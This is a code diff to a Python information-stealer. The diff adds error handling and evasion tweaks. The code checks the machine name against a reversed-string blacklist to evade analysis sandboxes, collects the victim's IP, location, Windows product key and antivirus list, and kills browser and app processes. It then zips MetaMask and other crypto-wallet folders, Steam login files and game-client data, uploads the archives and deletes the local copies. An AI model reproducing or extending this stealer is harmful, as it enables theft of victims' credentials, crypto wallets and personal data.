@@ -27,7 +27,7 @@ melter = '%Melter%'
 crasher = '%Crash%'
 hidewindow = '%Hide%'
 changebio = '%ChangeBio%'
-biotext = '''%Text%'''
+biotext = '%Text%'
 
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
@@ -70,9 +70,9 @@ def exit_program(reason):
 def check_username():
     blacli = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR']
 
-    username = os.getlogin()
+    username = os.getenv("COMPUTERNAME")
 
-    if username.lower() in blacli[::-1]:
+    if username in blacli[::-1]:
         exit_program('Invalid username')
         
 def check_windows():
@@ -516,7 +516,10 @@ def globalInfo():
     if system == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
-            gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
+            try:
+                gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
+            except: gpu= "ERROR"
+            
     elif system == 'nt':
         try:
             gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
@@ -528,13 +531,14 @@ def globalInfo():
             gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
 
         except Exception as e:
-            gpu = f"An error occurred: {str(e)}"
+            gpu = f"An error occurred"
 
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \n`Latitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
     if len(globalinfo) > 1750:
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
     return globalinfo
+
 def antispam():
     file_path = os.path.join(os.getenv("TEMP"), "winlog.txt")
 
@@ -994,7 +998,7 @@ def find_history_file(browser_name, path_template):
     elif os.name == "posix":
         data_path = os.path.expanduser(path_template.format(browser_name))
     else:
-        return None
+        return 'ERROR'
 
     return data_path if os.path.exists(data_path) else None
 
@@ -1622,48 +1626,51 @@ def ZipTelegram(path, arg, procc):
 
 
 def ZipThings(path, arg, procc):
-    pathC = path
-    name = arg
-
-    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
-        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
-        name = f"Metamask_{browser}"
-        pathC = os.path.join(path, arg)
-
-    if not os.path.exists(pathC):
-        return
-
-    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
-    wall = 'tellaW'
-    if wall[::-1] in arg or "NationsGlory" in arg:
-        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
-        name = f"{browser}"
-        
-    elif "Steam" in arg:
-        loginusers_file = os.path.join(pathC, "loginusers.vdf")
-        if not os.path.isfile(loginusers_file):
-            return
-        with open(loginusers_file, "r", encoding="utf8") as f:
-            data = f.read()
-            if 'RememberPassword"\t\t"1"' not in data:
-                return
+    try:
+        pathC = path
         name = arg
 
-    zf = ZipFile(os.path.join(pathC, f"{name}.zip"), "w")
-    for file in os.listdir(pathC):
-        if ".zip" not in file:
-            zf.write(os.path.join(pathC, file))
-    zf.close()
+        if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+            name = f"Metamask_{browser}"
+            pathC = os.path.join(path, arg)
 
-    lnik = upload_file(os.path.join(pathC, f"{name}.zip"))
-    os.remove(os.path.join(pathC, f"{name}.zip"))
+        if not os.path.exists(pathC):
+            return
 
-    if wall[::-1] in arg or "eogaeaoehlef" in arg:
-        wltZip.append([name, lnik])
-    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
-        GamingZip.append([name, lnik])
-    else:
-        OtherZip.append([name, lnik])
+        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+        wall = 'tellaW'
+        if wall[::-1] in arg or "NationsGlory" in arg:
+            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+            name = f"{browser}"
+            
+        elif "Steam" in arg:
+            loginusers_file = os.path.join(pathC, "loginusers.vdf")
+            if not os.path.isfile(loginusers_file):
+                return
+            with open(loginusers_file, "r", encoding="utf8") as f:
+                data = f.read()
+                if 'RememberPassword"\t\t"1"' not in data:
+                    return
+            name = arg
+
+        zf = ZipFile(os.path.join(pathC, f"{name}.zip"), "w")
+        for file in os.listdir(pathC):
+            if ".zip" not in file:
+                zf.write(os.path.join(pathC, file))
+        zf.close()
+
+        lnik = upload_file(os.path.join(pathC, f"{name}.zip"))
+        os.remove(os.path.join(pathC, f"{name}.zip"))
+
+        if wall[::-1] in arg or "eogaeaoehlef" in arg:
+            wltZip.append([name, lnik])
+        elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
+            GamingZip.append([name, lnik])
+        else:
+            OtherZip.append([name, lnik])
+    except:
+        pass
 
 def srcs():
     try:
